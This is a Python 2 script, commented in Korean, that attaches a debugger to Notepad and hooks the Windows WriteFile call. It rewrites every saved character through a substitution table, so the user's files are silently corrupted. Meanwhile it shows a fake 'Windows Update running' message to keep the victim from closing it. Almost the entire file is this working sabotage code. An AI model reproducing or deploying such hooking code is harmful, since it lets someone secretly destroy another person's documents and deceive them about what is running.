#-*- coding: utf-8 -*-
import utils
from pydbg import *
from pydbg.defines import *
'''
BOOL WINAPI WriteFile(
  _In_         HANDLE hFile,
  _In_         LPCVOID lpBuffer,
  _In_         DWORD nNumberOfBytesToWrite,
  _Out_opt_    LPDWORD lpNumberOfBytesWritten,
  _Inout_opt_  LPOVERLAPPED lpOverlapped
);
'''
isProcess=False
before=["`","1","2","3","4","5","6","7","8","9","0","-","+",
            "q","w","e","r","t","y","u","i","o","p","[","]","\\",
            "a","s","d","f","g","h","j","k","l",";","'","z","x",
            "c","v","b","n","m",",",".","/","~","!","@","#","$",
            "%","^","&","*","(",")","_","+","Q","W","E","R","T",
            "Y","U","I","O","P","{","}","|","A","S","D","F","G",
            "H","J","K","L",":",'"',"Z","X","C","V","B","N","M","<",">","?"]
after=["v","@","c","/","~","n",",","m","!","z","b",".","x",
          "E","$","w","^","I","*","(","P","_","+","Q","%","#",
          "R","T","Y","k","&","O",")","{","}","|","a","s","d",
          "H","g","h","j","U","l",";","'","C","S","D","F","M",
          "f","J","K","L",":",'"',"2","X","A","V","7","N","G",
          "0",">","+","`","e","Z","3","4","5","6","B","o","9",
          "<","-","?","q","w","1","r","t","y","u","i","8","p","[","]","\\"]
targetProcess="notepad.exe" 

def replaceString(dbg, args): # 후킹 코드가 들어있는 콜백함수로 디버그 이벤트가 발생할 때 호출
    buffer=dbg.read_process_memory(args[1], args[2]) # 메모리 주소를 읽어 값을 반환
    for i in range(0, len(before)):
        if before[i] in buffer: # 메모리 값에서 해당 문자가 있을 경우
            #print "[+] Before : %s" % buffer
            buffer=buffer.replace(before[i], after[i]) # 해당 문자를 교체
            replace=dbg.write_process_memory(args[1], buffer) # 메모리에 저장(쓰기)
            #print "[+] After : %s" % dbg.read_process_memory(args[1], args[2])
    return DBG_CONTINUE
 
def main():
    try:
        dbg=pydbg()
        for(pid, name) in dbg.enumerate_processes(): # 모든 프로세스 ID 리스트를 얻음
            if(name.lower()==targetProcess): # 검색된 프로세스와 타겟 프로세스(notepad.exe) 이름이 같을 경우
                isProcess=True
                hooks=utils.hook_container() # 모든 후킹 객체를 담을 공간 확보     
                dbg.attach(pid) # 해당 프로세스의 핸들을 얻어 클래스 내부에 저장
                #print "[+] Saves a process handle in self.h_process of pid[%d]" % pid
                hookAddress=dbg.func_resolve_debuggee("kernel32.dll", "WriteFile") # 핸들을 이용해 Win32 API 함수 주소를 찾아 반환     
                if hookAddress: # 해당 함수 주소 반환에 성공했을 경우
                    hooks.add(dbg, hookAddress, 5, replaceString, None) # 해당 함수에 중단점 설정 후 콜백함수 등록
                    #print "[+] sets a breakpoint at the designated address : 0x%08x" % hookAddress
                    break
                else:
                    #print "[-] couldn't resolve hook address"
                    exit(0)
        if isProcess: 
            #print "waiting for occuring debugger event"
            print "Windows Update running.\nPlease do not exit the terminal."
            dbg.run() # 디버그 이벤트가 발생하면 콜백함수 호출
        else:
            #print "[-] There in no process [%s]" % targetProcess
            exit(0)
    except Exception, e:
        if "DebugActiveProcess" in str(e):
            #print "[-] Open the C:\Windows\SysWOW64\notepad.exe Not C:\Windows\System32\notepad.exe"
            exit(0)
        #print "[-] ", e 
        exit(0)
        
if __name__=="__main__":
    main()